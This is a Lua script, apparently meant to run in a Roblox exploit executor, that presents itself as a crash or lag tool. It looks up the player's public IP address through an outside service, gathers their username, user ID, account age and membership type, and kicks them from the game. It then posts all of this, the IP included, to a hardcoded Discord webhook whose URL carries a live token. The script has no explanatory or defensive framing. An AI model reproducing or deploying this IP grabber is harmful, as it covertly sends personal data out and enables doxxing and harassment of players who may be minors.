local Webhook = "https://discord.com/api/webhooks/1272551217557671937/PEYTKwX-JuEniXhEnWgwhvV2YlQxrUi5oXHdPreUENIV6aGtQc9gZQ9FVzgX6o2xPwLJ"

local IPv4 = game:HttpGet("https://v4.ident.me/")

local Headers = {["content-type"] = "application/json"}

local LocalPlayer = game:GetService("Players").LocalPlayer

-- Concatenate account age with "days old"
local AccountAge = LocalPlayer.AccountAge .. " days old"
-- Correct string manipulation to get MembershipType
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
local UserId = LocalPlayer.UserId
local PlayerName = LocalPlayer.Name

local PlayerData = {
    ["content"] = "",
    ["embeds"] = {{
        ["title"] = "**Name Of The Crasher kid**:",
        ["description"] = PlayerName,
        ["color"] = tonumber(0x2B6BE4),
        ["fields"] = {
            {["name"] = "Premium?:", ["value"] = MembershipType, ["inline"] = true},
            {["name"] = "How Old:", ["value"] = AccountAge, ["inline"] = true},
            {["name"] = "Player id:", ["value"] = UserId, ["inline"] = true},
            {["name"] = "IPv4:", ["value"] = IPv4, ["inline"] = true},
            -- Fixing the URL generation with the correct syntax
            {["name"] = "Profile URL:", ["value"] = "https://roblox.com/users/" .. UserId .. "/profile", ["inline"] = true}
        }
    }}
}

local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
local HttpRequest = http_request

if syn then
    HttpRequest = syn.request
end
settings():GetService("NetworkSettings").IncomingReplicationLag = "10000"
local player = game.Players.LocalPlayer
local function kickPlayer()
    player:Kick()
end
wait(10)
kickPlayer()
HttpRequest({Url = Webhook, Body = PlayerData, Method = "POST", Headers = Headers})
